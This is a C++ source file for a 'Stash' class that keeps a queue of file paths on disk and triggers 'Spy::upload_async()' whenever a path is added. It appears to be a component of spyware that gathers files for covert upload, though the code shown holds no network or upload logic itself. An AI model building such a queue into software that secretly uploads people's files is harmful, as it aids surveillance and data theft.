#include "stash.h"

void Stash::import_stash()
{
	LOG("Import stash...");
	stg_queue->clear();
	char * buffer = new char[MAX_PATH];
	LOG("Read stash file and push to stash...");
	while (!feof(file_handle) && fgets(buffer, MAX_PATH, file_handle))
	{
		int last_index = strlen(buffer);
		if (last_index > 0)
		{
			if (buffer[last_index - 1] == '\n')
				buffer[last_index - 1] = '\0';
			stg_queue->push(buffer);
		}
	}
	delete[] buffer;
	LOG("Imported");
}

void Stash::export_stash()
{
	LOG("Export stash...");
	reopen("w+b");
	FILE * _handle = file_handle;
	bool flag = true;
	const char * file_path;
	while ((file_path = stg_queue->peek(flag)) != NULL)
	{
		fputs(file_path, file_handle);
		fputs("\n", file_handle);
		flag = false;
	}
	fflush(file_handle);
	LOG("Exported");
}

void Stash::push(const char * file_path)
{
	stg_queue->push(file_path);
	export_stash();
	Spy::upload_async();
}

bool Stash::empty() const
{
	return stg_queue->empty();
}

const char * Stash::pop(char * buffer)
{
	return stg_queue->pop(buffer);
}

Stash::Stash(const char * file_path)
	:Storable(file_path, "a+b")
{
	stg_queue = new Queue();
	import_stash();
}

Stash::~Stash()
{
	delete stg_queue;
}
